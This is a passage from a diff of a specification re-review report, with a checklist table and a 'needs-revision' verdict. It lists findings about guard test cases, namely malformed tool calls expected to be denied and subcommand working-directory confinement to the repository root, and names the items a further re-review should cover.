+| domain, interfaces, architecture | D5 Decisions with alternatives recorded | pass (four new rows in architecture §6.2, each with the alternative rejected) |
+| DoD and index | O1 Every REQ and NFR covered | pass (TR-05 119/119, 16/16) |
+| DoD and index | O2 Evidence types fit the statements | pass (C002-DOD-022 now names the real-host check C002-TS-537) |
+| DoD and index | O3 Global items referenced | pass |
+| DoD and index | X1 Index is navigation only | CR-35 |
+| plan | P1 … P7 | n/a: spec phase |
+| ideation | I1 … I10 | n/a: spec phase (G1 approved 2026-10-14; ideation not stale) |
+
+## Verdict
+
+**needs-revision** — no blocker remains. The fix round resolved eight of the nine re-review 1
+findings, and CR-29 partially. P-01's round 4 answers are applied faithfully:
+
+- Q-safety-04: cases with no `cwd`, an empty `cwd` or no tool name are replayed as malformed calls
+  expecting `deny`; unknown `architect:sdd-*` callers expect `allow` on OpenCode; the not-applicable
+  list keeps identity cases only, and the release check recomputes every expectation.
+- Q-guards-05: `--cwd` of a writing subcommand is confined to the repository root on every host,
+  with corpus cases and the wider C002-GOAL-05.
+
+One major point remains before G2:
+
+- CR-32 (major): the fix also feeds `requires` cases (PG-163) as malformed calls. That passes them
+  by construction and leaves file-link handling unmeasured on REF-WIN, which goes beyond
+  Q-safety-04. The recommended fix (require the capability on the replay host) follows P-01's "every
+  case is still replayed" and needs P-01 only to confirm the REF-WIN prerequisite (Q-safety-05).
+
+The four minor findings (CR-33 … CR-36) can go in the same short round. The architect's point
+(CR-36) is minor and needs no P-01 decision. A further re-review can be limited to C002-REQ-630,
+C002-IF-009 §2.1, §2.2 and §5, C002-INV-14, C002-TS-631, C002-TS-637, C002-TS-643, C002-DOD-008,
+C002-IF-008 §1.2, C002-TS-636, C002-US-502 and the index.
